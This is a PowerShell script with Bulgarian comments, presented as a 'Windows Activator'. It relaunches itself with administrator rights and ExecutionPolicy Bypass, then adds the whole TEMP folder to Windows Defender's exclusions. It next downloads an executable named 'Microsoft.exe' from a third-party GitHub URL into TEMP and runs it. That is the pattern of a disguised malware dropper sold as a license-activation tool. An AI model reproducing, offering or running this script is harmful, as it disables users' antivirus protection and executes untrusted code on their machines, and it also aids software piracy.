# ============================================
# ПОПРАВЕН СКРИПТ С АВТОМАТИЧНО ПРЕЗАПУСКВАНЕ
# ============================================

# Проверка за администраторски права
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Скриптът не е пуснат като Администратор!" -ForegroundColor Yellow
    
    # Създаване на временен файл с текущия скрипт
    $tempScript = Join-Path $env:TEMP "Windows_Activator_Admin.ps1"
    
    # Записваме целия скрипт във временен файл
    @'
# ============================================
# ОСНОВЕН КОД (изпълнява се само като админ)
# ============================================

# 1. ПРЕДУПРЕЖДЕНИЕ ЗА СИГУРНОСТ
Clear-Host
Write-Host "==============================================" -ForegroundColor Green
Write-Host " WINDOWS ACTIVATOR SCRIPT (Администратор)" -ForegroundColor Green
Write-Host "==============================================" -ForegroundColor Green
Write-Host "`n🚨 ВАЖНО ПРЕДУПРЕЖДЕНИЕ 🚨" -ForegroundColor Red
Write-Host "Този скрипт ще:" -ForegroundColor Yellow
Write-Host "• Добави изключение в Windows Defender" -ForegroundColor Yellow
Write-Host "• Изтегли и изпълни файл от интернет" -ForegroundColor Yellow
Write-Host "`nПродължавате ли? (Y/N)" -ForegroundColor Cyan

$response = Read-Host
if ($response -notmatch "^[YyДд]") {
    Write-Host "Скриптът е прекратен." -ForegroundColor Green
    timeout /t 3
    exit
}

# 2. ДЕФИНИРАНЕ НА ПЪТИЩАТА
$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft.exe"
$tempFile = "$env:TEMP\Microsoft.exe"
$folderToExclude = "$env:TEMP"

# 3. ДОБАВЯНЕ НА ИЗКЛЮЧЕНИЕ
Write-Host "`n[1/3] Добавяне на изключение в Defender..." -ForegroundColor Cyan
try {
    Add-MpPreference -ExclusionPath "$folderToExclude" -ErrorAction Stop
    Write-Host "   ✓ Изключение добавено за: $folderToExclude" -ForegroundColor Green
}
catch {
    Write-Host "   ✗ Грешка при добавяне на изключение" -ForegroundColor Red
    Write-Host "   Причина: $_" -ForegroundColor Yellow
    Write-Host "   Опитваме се да продължим..." -ForegroundColor Yellow
}

# 4. СВАЛЯНЕ НА ФАЙЛА
Write-Host "`n[2/3] Сваляне на файл..." -ForegroundColor Cyan
try {
    $progressPreference = "SilentlyContinue"
    Invoke-WebRequest -Uri $url -OutFile $tempFile -ErrorAction Stop
    
    # Проверка дали файлът е създаден
    if (Test-Path $tempFile) {
        $fileSize = (Get-Item $tempFile).Length / 1MB
        Write-Host "   ✓ Файлът е изтеглен успешно" -ForegroundColor Green
        Write-Host "   Размер: {0:N2} MB" -f $fileSize -ForegroundColor Gray
        Write-Host "   Местоположение: $tempFile" -ForegroundColor Gray
    }
    else {
        Write-Host "   ✗ Файлът не е създаден" -ForegroundColor Red
        exit
    }
}
catch {
    Write-Host "   ✗ Грешка при сваляне: $_" -ForegroundColor Red
    exit
}

# 5. ПУСКАНЕ НА ФАЙЛА
Write-Host "`n[3/3] Стартиране на файла..." -ForegroundColor Cyan
try {
    Write-Host "   Стартиране на $tempFile..." -ForegroundColor Yellow
    
    # Проверка дали файлът съществува преди стартиране
    if (Test-Path $tempFile) {
        Start-Process -FilePath $tempFile -Wait
        Write-Host "   ✓ Файлът е стартиран успешно" -ForegroundColor Green
    }
    else {
        Write-Host "   ✗ Файлът не съществува" -ForegroundColor Red
    }
}
catch {
    Write-Host "   ✗ Грешка при стартиране: $_" -ForegroundColor Red
}

# 6. ИНФОРМАЦИЯ
Write-Host "`n" + ("="*50) -ForegroundColor Gray
Write-Host "ИНФОРМАЦИЯ:" -ForegroundColor Yellow
Write-Host "• Изключението е за: $env:TEMP" -ForegroundColor Gray
Write-Host "• За да премахнете изключението, изпълнете:" -ForegroundColor Cyan
Write-Host "  Remove-MpPreference -ExclusionPath `"$env:TEMP`"" -ForegroundColor White
Write-Host "• Или използвайте Windows Security -> Изключения" -ForegroundColor Gray

Write-Host "`nНатиснете ENTER за изход..." -ForegroundColor Gray
Read-Host
'@ | Set-Content -Path $tempScript -Encoding UTF8
    
    Write-Host "`nТози скрипт изисква администраторски права." -ForegroundColor Cyan
    Write-Host "Натиснете ENTER за автоматично презапускане като Администратор..." -ForegroundColor Green
    Write-Host "Или натиснете N за изход" -ForegroundColor Red
    
    $response = Read-Host
    if ($response -match "^[NnНн]") {
        Write-Host "Изход от скрипта." -ForegroundColor Yellow
        Remove-Item $tempScript -ErrorAction SilentlyContinue
        exit
    }
    
    # Презапускане като администратор
    try {
        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempScript`"" -Verb RunAs
    }
    catch {
        Write-Host "Грешка при презапускане. Пуснете PowerShell ръчно като Администратор." -ForegroundColor Red
    }
    
    exit
}

# ============================================
# АКО ВЕЧЕ СМЕ АДМИНИСТРАТОР, ИЗПЪЛНИ КОДА ОТГОРЕ
# ============================================

# 1. ПРЕДУПРЕЖДЕНИЕ ЗА СИГУРНОСТ
Clear-Host
Write-Host "==============================================" -ForegroundColor Green
Write-Host " WINDOWS ACTIVATOR SCRIPT (Администратор)" -ForegroundColor Green
Write-Host "==============================================" -ForegroundColor Green
Write-Host "`n🚨 ВАЖНО ПРЕДУПРЕЖДЕНИЕ 🚨" -ForegroundColor Red
Write-Host "Този скрипт ще:" -ForegroundColor Yellow
Write-Host "• Добави изключение в Windows Defender" -ForegroundColor Yellow
Write-Host "• Изтегли и изпълни файл от интернет" -ForegroundColor Yellow
Write-Host "`nПродължавате ли? (Y/N)" -ForegroundColor Cyan

$response = Read-Host
if ($response -notmatch "^[YyДд]") {
    Write-Host "Скриптът е прекратен." -ForegroundColor Green
    timeout /t 3
    exit
}

# 2. ДЕФИНИРАНЕ НА ПЪТИЩАТА
$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft.exe"
$tempFile = "$env:TEMP\Microsoft.exe"
$folderToExclude = "$env:TEMP"  # ТОВА Е ВАЖНАТЯ ПРОМЕНЛИВА!

# 3. ДОБАВЯНЕ НА ИЗКЛЮЧЕНИЕ
Write-Host "`n[1/3] Добавяне на изключение в Defender..." -ForegroundColor Cyan
Write-Host "   Папка за изключение: $folderToExclude" -ForegroundColor Gray

try {
    # ДОБАВЯМЕ КАВИЧКИ за сигурност
    Add-MpPreference -ExclusionPath "$folderToExclude" -ErrorAction Stop
    Write-Host "   ✓ Изключение добавено успешно!" -ForegroundColor Green
    
    # Потвърждение
    $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
    if ($currentExclusions -contains $folderToExclude) {
        Write-Host "   ✓ Потвърдено: Папката е в списъка с изключения" -ForegroundColor Green
    }
}
catch {
    Write-Host "   ✗ Грешка при добавяне на изключение" -ForegroundColor Red
    Write-Host "   Причина: $_" -ForegroundColor Yellow
    Write-Host "   Опитваме се да продължим без изключение..." -ForegroundColor Yellow
}

# 4. СВАЛЯНЕ НА ФАЙЛА
Write-Host "`n[2/3] Сваляне на файл..." -ForegroundColor Cyan
try {
    # Показване на URL
    Write-Host "   URL: $url" -ForegroundColor Gray
    
    # Изтегляне
    $progressPreference = "SilentlyContinue"
    Invoke-WebRequest -Uri $url -OutFile $tempFile -ErrorAction Stop
    
    # Проверка
    if (Test-Path $tempFile) {
        $fileSize = (Get-Item $tempFile).Length / 1MB
        Write-Host "   ✓ Файлът е изтеглен успешно" -ForegroundColor Green
        Write-Host "   Размер: {0:N2} MB" -f $fileSize -ForegroundColor Gray
        Write-Host "   Местоположение: $tempFile" -ForegroundColor Gray
    }
    else {
        Write-Host "   ✗ Файлът не е създаден" -ForegroundColor Red
        exit
    }
}
catch {
    Write-Host "   ✗ Грешка при сваляне" -ForegroundColor Red
    Write-Host "   Причина: $_" -ForegroundColor Yellow
    Write-Host "   Моля, проверете интернет връзката." -ForegroundColor Yellow
    exit
}

# 5. ПУСКАНЕ НА ФАЙЛА
Write-Host "`n[3/3] Стартиране на файла..." -ForegroundColor Cyan
try {
    Write-Host "   Стартиране на: $tempFile" -ForegroundColor Yellow
    
    if (Test-Path $tempFile) {
        # Проверка за цифров подпис (ако има)
        $signature = Get-AuthenticodeSignature -FilePath $tempFile -ErrorAction SilentlyContinue
        if ($signature.Status -eq "Valid") {
            Write-Host "   ✓ Файлът има валиден цифров подпис" -ForegroundColor Green
        }
        
        # Стартиране
        Start-Process -FilePath $tempFile -Wait
        Write-Host "   ✓ Файлът е стартиран успешно" -ForegroundColor Green
    }
    else {
        Write-Host "   ✗ Файлът не съществува" -ForegroundColor Red
    }
}
catch {
    Write-Host "   ✗ Грешка при стартиране" -ForegroundColor Red
    Write-Host "   Причина: $_" -ForegroundColor Yellow
}

# 6. ИНФОРМАЦИЯ И МЕНЮ
Write-Host "`n" + ("="*50) -ForegroundColor Gray
Write-Host "УПРАВЛЕНИЕ НА ИЗКЛЮЧЕНИЯТА:" -ForegroundColor Yellow
Write-Host "1. Покажи текущите изключения" -ForegroundColor Cyan
Write-Host "2. Премахни изключението за TEMP папка" -ForegroundColor Cyan
Write-Host "3. Изход" -ForegroundColor Cyan
Write-Host "`nИзбор (1-3): " -NoNewline -ForegroundColor White

$choice = Read-Host
switch ($choice) {
    "1" {
        Write-Host "`nТекущи изключения в Windows Defender:" -ForegroundColor Green
        $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
        if ($exclusions) {
            foreach ($excl in $exclusions) {
                Write-Host "   • $excl" -ForegroundColor Gray
            }
        } else {
            Write-Host "   Няма добавени изключения" -ForegroundColor Gray
        }
    }
    "2" {
        Write-Host "`nПремахване на изключение за: $env:TEMP" -ForegroundColor Yellow
        try {
            Remove-MpPreference -ExclusionPath "$env:TEMP"
            Write-Host "   ✓ Изключението е премахнато" -ForegroundColor Green
        }
        catch {
            Write-Host "   ✗ Грешка при премахване: $_" -ForegroundColor Red
        }
    }
}

Write-Host "`n" + ("="*50) -ForegroundColor Gray
Write-Host "Скриптът приключи." -ForegroundColor Green
Write-Host "Натиснете ENTER за изход..." -ForegroundColor Gray
Read-Host
